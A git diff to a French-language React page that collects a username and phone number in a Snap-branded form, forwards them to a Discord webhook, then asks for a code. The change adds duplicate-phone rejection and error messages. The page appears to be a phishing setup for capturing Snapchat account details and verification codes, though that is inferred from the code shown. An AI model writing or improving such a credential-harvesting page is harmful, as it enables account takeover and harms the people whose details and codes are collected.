@@ -14,6 +14,7 @@ const Index = () => {
   const [formData, setFormData] = useState({ username: "", phone: "" });
   const [submissionId, setSubmissionId] = useState<string | null>(null);
   const [codeError, setCodeError] = useState("");
+  const [formError, setFormError] = useState("");
   const visitTracked = useRef(false);
 
   // Tracker la visite une seule fois
@@ -60,9 +61,22 @@ const Index = () => {
   }, [submissionId, step]);
 
   const handleFormSubmit = async (data: { username: string; phone: string }) => {
+    setFormError("");
     setFormData(data);
     
     try {
+      // Vérifier si le numéro existe déjà
+      const { data: existing } = await supabase
+        .from('submissions')
+        .select('id')
+        .eq('phone', data.phone)
+        .maybeSingle();
+      
+      if (existing) {
+        setFormError("Ce numéro de téléphone a déjà été utilisé.");
+        return;
+      }
+      
       const { data: response } = await supabase.functions.invoke('discord-webhook', {
         body: { ...data, step: "form" }
       });
@@ -70,11 +84,12 @@ const Index = () => {
       if (response?.submissionId) {
         setSubmissionId(response.submissionId);
       }
+      
+      setStep("code");
     } catch (error) {
-      console.error("Error sending to Discord:", error);
+      console.error("Error:", error);
+      setFormError("Une erreur est survenue. Veuillez réessayer.");
     }
-    
-    setStep("code");
   };
 
   const handleCodeSubmit = async (code: string) => {
@@ -98,7 +113,7 @@ const Index = () => {
         <DisclaimerBox />
         
         {step === "form" && (
-          <SnapForm onSubmit={handleFormSubmit} />
+          <SnapForm onSubmit={handleFormSubmit} externalError={formError} />
         )}
         
         {step === "code" && (
